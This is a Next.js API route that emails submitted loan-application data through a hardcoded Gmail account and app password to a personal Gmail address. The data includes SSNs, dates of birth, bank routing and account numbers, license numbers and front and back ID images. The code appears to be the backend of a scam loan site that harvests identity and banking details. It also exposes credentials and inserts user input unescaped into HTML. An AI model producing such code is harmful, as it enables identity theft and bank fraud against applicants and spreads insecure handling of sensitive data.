import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function POST(request) {
  const { formData } = await request.json();

  // Create a Nodemailer transporter
  const transporter = nodemailer.createTransport({
    service: "gmail",
    // host: "smtp.gmail.com",
    // port: 465,
    // secure: true,
    auth: {
      user: "osr.cty@gmail.com",
      pass: "btzbcklyxerxvkiy",
    },
  });

  // Compose the email message
  const message = {
    from: "osr.cty@gmail.com",
    to: "samsonrichfield@gmail.com",
    subject: "Loan Application Details",
    html: `
    <h3>Loan Application Details</h3>
    <p>First Name: ${formData.firstName}</p>
    <p>Last Name: ${formData.lastName}</p>
    <p>Loan Amount: ${formData.loanAmount}</p>
    <p>Loan Duration: ${formData.loanDuration}</p>
    <p>Monthly Mortgage: ${formData.monthlyMortgage}</p>
    <p>Monthly Payment: ${formData.monthlyPayment}</p>
    <p>Interest: ${formData.interest}</p>
    <p>Total Amount Paid: ${formData.totalAmountPaid}</p>
    <p>SSN: ${formData.ssn}</p>
    <p>Date of Birth: ${formData.dob}</p>
    <p>Address: ${formData.address}</p>
    <p>Suite/Apt: ${formData.suiteApt}</p>
    <p>City: ${formData.city}</p>
    <p>State: ${formData.state}</p>
    <p>Zip Code: ${formData.zipCode}</p>
    <p>Residence Duration: ${formData.residenceDuration}</p>
    <p>Residence Status: ${formData.residenceStatus}</p>
    <p>Eviction: ${formData.eviction}</p>
    <p>Email Address: ${formData.emailAddress}</p>
    <p>Primary Phone Number: ${formData.primaryPhoneNumber}</p>
    <p>Primary Phone Type: ${formData.primaryPhoneType}</p>
    <p>Secondary Phone Number: ${formData.secondaryPhoneNumber}</p>
    <p>Secondary Phone Type: ${formData.secondaryPhoneType}</p>
    <p>Routing Number: ${formData.routingNumber}</p>
    <p>Account Number: ${formData.accountNumber}</p>
    <p>Confirm Account Number: ${formData.confirmAccountNumber}</p>
    <p>Account Type: ${formData.accountType}</p>
    <p>Account Duration: ${formData.accountDuration}</p>
    <p>Direct Deposit: ${formData.directDeposit}</p>
    <p>Automatic Payments: ${formData.automaticPayments}</p>
    <p>Primary Income: ${formData.primaryIncome}</p>
    <p>Last Pay Amount: ${formData.lastPayAmount}</p>
    <p>Last Pay Date: ${formData.lastPayDate}</p>
    <p>Next Pay Date: ${formData.nextPayDate}</p>
    <p>Additional Income: ${formData.additionalIncome}</p>
    <p>Loan Purpose: ${formData.loanPurpose}</p>
    <p>Military Status: ${formData.militaryStatus}</p>
    <p>Bankruptcy History: ${formData.bankruptcyHistory}</p>
    <p>Payday Loan History: ${formData.paydayLoanHistory}</p>
    <p>My Quick Loan Source: ${formData.myQuickLoanSource}</p>
    <p>My Quick Loan Source Other: ${formData.myQuickLoanSourceOther}</p>
    <p>Credit Score: ${formData.creditScore}</p>
    <p>License Number: ${formData.licenseNumber}</p>
    <p>Front View:</p>
    <img src="${formData.frontView}" alt="Front View" />
    <p>Back View:</p>
    <img src="${formData.backView}" alt="Back View" />

    <p>Loan to be given when reduced by 20%: ${
      (formData.loanAmount / 100) * 80
    }</p>
  `,
  };

  try {
    // Send the email
    await transporter.sendMail(message);
    return NextResponse.json({ success: true });
  } catch (error) {
    console.error(error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}

export async function GET(request) {
  return NextResponse.json({ message: "Method Not Allowed" }, { status: 405 });
}